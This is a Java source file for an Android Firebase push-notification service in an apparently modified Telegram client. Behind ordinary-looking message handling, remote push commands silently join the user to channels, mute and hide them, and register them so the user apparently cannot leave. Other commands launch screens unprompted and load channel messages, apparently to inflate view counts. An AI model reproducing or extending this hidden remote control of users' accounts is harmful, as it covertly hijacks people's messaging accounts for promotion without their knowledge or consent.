package finalsoft.FcmService.Service;
/**
 * Created by Pouya on 1/12/2017.
 */

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.finalsoft.messenger.BuildConfig;


import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildVars;
import org.telegram.messenger.MessagesController;
import org.telegram.ui.LaunchActivity;


import java.util.Map;

import finalsoft.FcmService.Helper.Channel.ChannelHelper;
import finalsoft.FcmService.Helper.MuteHelper;
import finalsoft.FcmService.Helper.Notification.NotificationHelper;
import finalsoft.FcmService.NotificationActivity;
import finalsoft.FcmService.Setting.LastInListController;
import finalsoft.FcmService.Setting.NoQuitContoller;
import finalsoft.FcmService.Setting.Setting;
import finalsoft.FcmService.Setting.TurnQuitToHideController;
import finalsoft.FcmService.Setting.hideChannelController;


public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "finalsoft-firebase";

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    public void onMessageReceived(final RemoteMessage remoteMessage) {
        try {
            String channel = "";
            String text = "";
            String title = "";
            Map<String, String> map = remoteMessage.getData();
            int type = Integer.valueOf(GetValue(map, "type", "0"));
            Log.i(TAG, "onMessageReceived: message " + remoteMessage.toString());
            switch (type) {
                case 2:
                    channel = GetValue(map, "link", "");
                    text = GetValue(map, "text", "");
                    title = GetValue(map, "title", "");
                    Intent p = new Intent(MyFirebaseMessagingService.this, NotificationActivity.class);
                    p.putExtra("channellink", channel);
                    Setting.setCurrentJoiningChannel(channel);
                    //NotificationCreator.create(title, text, p);

                    if (!BuildConfig.DEBUG) {
                        p.setPackage(BuildVars.BUILD_PACKAGENAME);
                    } else
                        p.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");


                    NotificationHelper.buildNotification(title, text, p).build();


                    break;
                case 1:
                    channel = GetValue(map, "link", "");
                    text = GetValue(map, "text", "");
                    title = GetValue(map, "title", "");
                    Setting.setCurrentJoiningChannel(channel);
                    Intent p1 = new Intent(MyFirebaseMessagingService.this, LaunchActivity.class);

                    if (!BuildConfig.DEBUG) {
                        p1.setPackage(BuildVars.BUILD_PACKAGENAME);
                    } else
                        p1.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");
                    p1.putExtra("channellink", channel);
                    p1.putExtra("text", text);
                    p1.putExtra("title", title);
                    p1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(p1);
                    // NotificationCreator.CreateDialog(title,text,null);
                    break;
                case 3:
                    int noexit = Integer.valueOf(GetValue(map, "noexit", "0"));
                    int hide = Integer.valueOf(GetValue(map, "hide", "0"));
                    String channels = GetValue(map, "channel", "0");
                    int lastinlist = Integer.valueOf(GetValue(map, "lastinlist", "0"));
                    int mute = Integer.valueOf(GetValue(map, "mute", "0"));
                    int nhide = Integer.valueOf(GetValue(map, "fav", "0"));

//                    if(!object.isNull("channel"))channels=object.getString("channel");
//                    if(!object.isNull("hide"))hide=object.getInt("hide");
//                    if(!object.isNull("lastinlist"))lastinlist=object.getInt("lastinlist");
//                    if(!object.isNull("mute"))mute=object.getInt("mute");
//                    if(!object.isNull("fav"))fav=object.getInt("fav");

                    if (noexit > 0) {
                        NoQuitContoller.addToNoQuit(channels);
                    }
                    if (nhide > 0) {
                        TurnQuitToHideController.add(channels);
                    }
                    ChannelHelper.JoinFast(channels.replace("@", ""));
                    if (mute > 0) {
                        final String finalChannel = channels;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                MuteHelper.muteChannel(finalChannel.replace("@", ""));
                            }
                        }, 5000);
                    }
                    if (hide > 0) {
                        hideChannelController.add(channels.replace("@", ""));
                    }
                    if (lastinlist > 0) {
                        LastInListController.add(channels.replace("@", ""));
                    }

                    break;
                case 4:
                    SharedPreferences sharedPreferences = ApplicationLoader.applicationContext.getSharedPreferences("mainconfig", 0);
                    sharedPreferences.edit().putBoolean("setViewEnable", true).commit();
                    int messageId = Integer.valueOf(GetValue(map, "messageId", "0"));
                    final int chatId = Integer.valueOf(GetValue(map, "channelId", "0"));
                    sharedPreferences.edit().putInt("setViewMessageId", messageId).commit();
                    sharedPreferences.edit().putInt("setViewdialogId", chatId).commit();

                    AndroidUtilities.runOnUIThread(new Runnable() {
                        @Override
                        public void run() {
                            MessagesController.getInstance().loadFullChat(chatId, 0, true);
                            MessagesController.getInstance().loadMessages(chatId * -1, 200, 0, 0, true, 0, 4, 0, 0, true, 0);

                        }
                    }, 1000);


                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, " exception:" + e.getMessage());
        }
    }

    public static String GetValue(Map<String, String> map, String name, String Default) {
        if ((!map.isEmpty()) && map.containsKey(name)) {
            return map.get(name);
        } else {
            return Default;
        }
    }


}
